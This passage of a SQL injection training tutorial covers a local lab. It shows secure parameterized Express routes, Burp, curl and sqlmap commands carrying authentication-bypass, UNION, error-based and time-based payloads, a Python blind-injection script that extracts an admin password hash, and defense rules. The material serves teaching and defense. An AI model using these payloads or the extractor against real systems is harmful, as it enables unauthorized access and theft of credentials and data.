  // Database receives query STRUCTURE first, then DATA separately
  // Data can NEVER become SQL code!
  const query =
    'SELECT id, username, email, role FROM users WHERE username = ? AND password = MD5(?)'

  const [rows] = await db.execute(query, [username, password])
  //                                       ↑             ↑
  //                            These go as DATA not SQL code

  if (rows.length > 0) {
    res.json({ success: true, user: rows[0] })
  } else {
    // ✅ Generic error message — doesn't reveal if user exists
    res.status(401).json({ success: false, message: 'Invalid credentials' })
  }
})

// ══════════════════════════════════════════════════════════════
// SECURE 2: Product Search (Parameterized + Whitelist)
// ══════════════════════════════════════════════════════════════

router.get('/products', async (req, res) => {
  const { category } = req.query

  // ✅ Whitelist validation: only allow known categories
  const allowedCategories = ['electronics', 'clothing', 'books', 'sports']

  if (category && !allowedCategories.includes(category)) {
    return res.status(400).json({ error: 'Invalid category' })
  }

  // ✅ Parameterized query — safe even without whitelist
  const query = 'SELECT name, price, category FROM products WHERE category = ? AND hidden = 0'
  const [rows] = await db.execute(query, [category])

  // ✅ Don't expose query in response
  res.json({ results: rows, count: rows.length })
})

// ══════════════════════════════════════════════════════════════
// SECURE 3: Search (Parameterized LIKE)
// ══════════════════════════════════════════════════════════════

router.get('/search', async (req, res) => {
  const { q } = req.query

  // ✅ LIKE with parameterized is safe — % goes in the VALUE not query
  const query = 'SELECT name, price FROM products WHERE name LIKE ?'
  const searchTerm = `%${q}%` // Build the LIKE pattern in JS safely

  try {
    const [rows] = await db.execute(query, [searchTerm])
    res.json({ results: rows })
  } catch (err) {
    // ✅ Generic error — don't expose database errors!
    console.error('Database error:', err)
    res.status(500).json({ error: 'Search failed' })
  }
})

// ══════════════════════════════════════════════════════════════
// SECURE 4: User by ID (Input validation + parameterized)
// ══════════════════════════════════════════════════════════════

router.get('/user', async (req, res) => {
  const { id } = req.query

  // ✅ Validate: id must be a positive integer
  const userId = parseInt(id, 10)
  if (isNaN(userId) || userId <= 0) {
    return res.status(400).json({ error: 'Invalid user ID' })
  }

  // ✅ Parameterized query
  const [rows] = await db.execute('SELECT id, username, email FROM users WHERE id = ?', [userId])

  if (rows.length > 0) {
    res.json({ user: rows[0] })
  } else {
    res.status(404).json({ error: 'User not found' })
  }
})

module.exports = router
```

---

## 13. How to Test with Burp Suite

### Setup Burp for Testing

```
1. Open Burp Suite Community
2. Proxy tab → Intercept → Turn ON
3. Open browser configured to use 127.0.0.1:8080 as proxy
4. Visit http://localhost:5000

Now every request is intercepted!
```

### Testing Authentication Bypass

```
1. POST /api/vuln/login with normal credentials first
2. Intercept the request in Burp
3. Send to Repeater (Ctrl+R)
4. In Repeater, modify the body:

Original:
{"username":"alice","password":"alice123"}

Attack 1 - bypass password:
{"username":"alice'--","password":"anything"}

Attack 2 - login as admin:
{"username":"' OR 1=1 LIMIT 1--","password":"x"}

5. Click Send, see the response!
```

### Testing with curl (No Burp Needed)

```bash
# Authentication bypass tests:

# Normal login:
curl -X POST http://localhost:5000/api/vuln/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}'

# Bypass — comment out password check:
curl -X POST http://localhost:5000/api/vuln/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'"'"'--","password":"doesntmatter"}'

# Login as any user:
curl -X POST http://localhost:5000/api/vuln/login \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"' OR 1=1 LIMIT 1--\",\"password\":\"x\"}"

# UNION injection — extract users table:
curl "http://localhost:5000/api/vuln/products?category=electronics%27%20UNION%20SELECT%20username,password,email%20FROM%20users--"

# Error based — extract version:
curl "http://localhost:5000/api/vuln/search?q=test%27%20AND%20extractvalue(1,concat(0x7e,version()))--"

# Time based — sleep 5 seconds:
curl -w "\nTotal time: %{time_total}s\n" \
  "http://localhost:5000/api/vuln/time?id=1%20AND%20SLEEP(5)--"
```

### Using SQLMap

```bash
# Install sqlmap
pip3 install sqlmap

# Test a URL automatically:
sqlmap -u "http://localhost:5000/api/vuln/user?id=1" --dbs

# Test POST request:
sqlmap -u "http://localhost:5000/api/vuln/login" \
  --data='{"username":"test","password":"test"}' \
  --content-type="application/json" \
  --dbs

# Dump a specific table:
sqlmap -u "http://localhost:5000/api/vuln/user?id=1" \
  -D sqli_lab \
  -T users \
  --dump

# Use Burp captured request:
# 1. In Burp: right-click request → Save item → save as request.txt
sqlmap -r request.txt --dbs
```

---

## 14. Defense — Fix Every Vulnerability

### Rule 1: ALWAYS Use Parameterized Queries

```javascript
// ❌ NEVER do this:
const query = `SELECT * FROM users WHERE email = '${email}'`
db.query(query)

// ✅ ALWAYS do this:
const query = 'SELECT * FROM users WHERE email = ?'
db.execute(query, [email])

// ✅ With multiple parameters:
const query = 'SELECT * FROM users WHERE email = ? AND role = ?'
db.execute(query, [email, 'user'])

// ✅ With ORM (Mongoose, Prisma, Sequelize):
// These are parameterized by default!
const user = await User.findOne({ email: email }) // Mongoose ✅
const user = await prisma.users.findFirst({
  // Prisma ✅
  where: { email: email },
})
const user = await User.findOne({ where: { email } }) // Sequelize ✅
```

### Rule 2: Validate and Whitelist Input

```javascript
const { z } = require('zod')

// Define strict schema
const loginSchema = z.object({
  username: z
    .string()
    .min(3)
    .max(50)
    .regex(/^[a-zA-Z0-9_]+$/, 'Only alphanumeric and underscore'),
  password: z.string().min(8).max(128),
})

// Use in route
router.post('/login', (req, res) => {
  const result = loginSchema.safeParse(req.body)
  if (!result.success) {
    return res.status(400).json({ error: result.error.errors })
  }
  // Now use result.data (validated and typed)
  const { username, password } = result.data
  // ...
})

// Whitelist for dynamic column/table names (when you MUST use them):
const allowedColumns = ['name', 'price', 'category']
const column = req.query.sortBy

if (!allowedColumns.includes(column)) {
  return res.status(400).json({ error: 'Invalid sort column' })
}

// Now safe to use in ORDER BY (you can't parameterize column names)
const query = `SELECT * FROM products ORDER BY ${column}`
```

### Rule 3: Least Privilege Database User

```sql
-- Create app-specific user with MINIMUM permissions:
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'StrongPassword123!';

-- Only grant what the app actually needs:
GRANT SELECT, INSERT, UPDATE ON sqli_lab.users TO 'app_user'@'localhost';
GRANT SELECT ON sqli_lab.products TO 'app_user'@'localhost';

-- NEVER grant:
-- GRANT ALL → too broad
-- GRANT DROP, CREATE, ALTER → dangerous
-- GRANT FILE → can read/write server files!

FLUSH PRIVILEGES;
```

### Rule 4: Hide Error Details

```javascript
// ❌ Never expose database errors to users:
try {
  const [rows] = await db.execute(query)
} catch (err) {
  res.json({ error: err.message }) // ← Exposes table names, SQL syntax, DB version!
}

// ✅ Log internally, return generic message:
try {
  const [rows] = await db.execute(query)
} catch (err) {
  console.error('[DB Error]', err) // Log internally for debugging
  res.status(500).json({ error: 'Something went wrong' }) // Generic to user
}
```

### Rule 5: Use ORM Correctly

```javascript
// Mongoose (MongoDB — but same principle):

// ❌ WRONG: Raw query with user input:
User.findOne({ $where: `this.username === '${username}'` }) // Injection!

// ✅ CORRECT: Let Mongoose build the query:
User.findOne({ username: username }) // Mongoose handles it safely

// ❌ WRONG: Using $regex without sanitization:
User.find({ name: { $regex: req.query.search } }) // ReDoS risk + injection

// ✅ CORRECT: Escape regex:
const escaped = req.query.search.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')
User.find({ name: { $regex: escaped, $options: 'i' } })
```

### Defense Summary Table

| Attack                | Prevention                                       |
| --------------------- | ------------------------------------------------ |
| Authentication Bypass | Parameterized query, bcrypt passwords            |
| UNION Injection       | Parameterized query                              |
| Error Based           | Hide error messages, parameterized               |
| Blind Boolean         | Parameterized query                              |
| Time Based            | Parameterized query                              |
| Second Order          | Parameterized in ALL queries, not just input     |
| WAF Bypass            | Fix the root cause (parameterized), not just WAF |
| Column injection      | Whitelist valid values                           |
| DBMS detection        | Hide error details, generic errors               |

---

## Practice Exercises

### Exercise 1 — Authentication Bypass (Beginner)

```
Target: POST /api/vuln/login
Goal:   Login as admin without knowing the password

Hints:
  1. Username field is injectable
  2. Use -- to comment out the password check
  3. Try: admin'--
```

### Exercise 2 — Extract All Users (Intermediate)

```
Target: GET /api/vuln/products?category=
Goal:   Use UNION injection to dump the users table

Steps:
  1. Find how many columns the query returns
  2. Confirm which columns are visible in output
  3. UNION with users table
```

### Exercise 3 — Blind Data Extraction (Advanced)

```
Target: GET /api/vuln/user?id=
Goal:   Extract admin's password hash character by character

Steps:
  1. Confirm boolean injection works (id=1 AND 1=1 vs 1=2)
  2. Find length of password: AND LENGTH(password)=X
  3. Extract each character: AND ASCII(SUBSTRING(password,X,1))=Y
  4. Write a script to automate this
```

### Exercise 4 — Automation Script

```python
# blind_sqli_extractor.py
# Automates boolean blind SQL injection
# Target: GET http://localhost:5000/api/vuln/user?id=1

import requests
import string

BASE_URL = "http://localhost:5000/api/vuln/user"

def is_true(payload):
    """Returns True if injection condition was true"""
    params = {'id': f"1 AND {payload}--"}
    r = requests.get(BASE_URL, params=params)
    data = r.json()
    return data.get('found', False)

def extract_string(sql_expression, max_length=50):
    """Extract a string value using boolean blind injection"""
    result = ""

    for pos in range(1, max_length + 1):
        # Binary search for each character
        low, high = 32, 126  # printable ASCII range

        while low <= high:
            mid = (low + high) // 2
            payload = f"ASCII(SUBSTRING(({sql_expression}),{pos},1))>{mid}"

            if is_true(payload):
                low = mid + 1
            else:
                # Check exact match
                exact_payload = f"ASCII(SUBSTRING(({sql_expression}),{pos},1))={mid}"
                if is_true(exact_payload):
                    result += chr(mid)
                    print(f"  Char {pos}: '{chr(mid)}'  → So far: '{result}'")
                    break
                else:
                    high = mid - 1
        else:
            break  # End of string

    return result

print("=== Blind SQL Injection Extractor ===\n")

print("[*] Extracting database name...")
db_name = extract_string("SELECT database()")
print(f"[+] Database: {db_name}\n")

print("[*] Extracting admin username...")
username = extract_string("SELECT username FROM users WHERE role='admin' LIMIT 1")
print(f"[+] Admin username: {username}\n")

print("[*] Extracting admin password hash...")
password = extract_string("SELECT password FROM users WHERE role='admin' LIMIT 1")
print(f"[+] Admin password hash: {password}\n")
```

---

## Next Steps

```
After mastering SQL Injection:

1. Do PortSwigger Labs (FREE):
   https://portswigger.net/web-security/sql-injection

2. Practice specific database types:
   - MySQL Injection.md  (next file in the repo!)
   - PostgreSQL Injection.md
   - MSSQL Injection.md

3. Learn SQLMap in depth:
   SQLmap.md (in the same folder)

4. Try Root Me challenges:
   https://www.root-me.org → Web-Server → SQL Injection

5. Next vulnerability to learn:
   → NoSQL Injection (MongoDB! Directly relevant to MERN)
   → XSS Injection
```
